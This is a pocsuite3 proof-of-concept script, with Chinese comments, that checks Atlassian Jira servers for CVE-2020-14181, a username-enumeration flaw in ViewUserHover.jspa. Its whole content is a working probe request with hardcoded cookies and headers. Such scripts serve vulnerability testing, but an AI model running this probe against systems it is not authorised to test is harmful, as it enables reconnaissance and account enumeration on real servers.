from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class Jira(POCBase):
    vulID = "CVE-2020-14181"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "小白"  # PoC作者的大名
    vulDate = "2022-07-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/AtlassianJira/Atlassian%20Jira%20ViewUserHover.jspa%20%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181.html"]  # 漏洞地址来源,0day不用写
    name = "Jira ViewUserHover.jspa 用户信息泄露漏洞"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "Atlassian Jira"  # 漏洞应用名称
    appVersion = """
Atlassian Jira < 7.13.6
Atlassian Jira 8.0.0 - 8.5.7
Atlassian Jira 8.6.0 - 8.12.0
    """  # 漏洞影响版本
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE  # SQL注入 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """未授权用户可以直接访问该接口爆破出潜在的用户名"""  # 漏洞简要描述
    pocDesc = """pocsuite -r .\pocs\*.py -u <url>"""  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/secure/ViewUserHover.jspa?username=admin"
        cookies = {"JIRA_PRD": "B01551747D0C730F2CFE26C98F2F0D37",
                   "atlassian.xsrf.token": "BGZ6-7SPK-TZS1-2Z9Y_922222986751ecefde9eb79de425f0249f0b7e16_lout",
                   "AWSALB": "1ga8wWHJ39hS3xhL6M/Vu1dzsFCgnAekPk2R6Zm02XJupuy6o5ZnfFsjYPgzeJNAC+MY8nk36M72E+Nvo3UhWtN6njdUicW6ZURDoEPq4UXiK6e6Og9I42DR73ir",
                   "AWSALBCORS": "1ga8wWHJ39hS3xhL6M/Vu1dzsFCgnAekPk2R6Zm02XJupuy6o5ZnfFsjYPgzeJNAC+MY8nk36M72E+Nvo3UhWtN6njdUicW6ZURDoEPq4UXiK6e6Og9I42DR73ir"}
        headers = {"Cache-Control": "max-age=0",
                   "Sec-Ch-Ua": "\" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"103\", \"Chromium\";v=\"103\"",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Dnt": "1",
                   "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"}
        try:
            response = requests.get(full_url, headers=headers, cookies=cookies, verify=False, timeout=10)
            if "Your session has timed out" not in response.text:
                result.append(self.url)
        except Exception:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(Jira)#



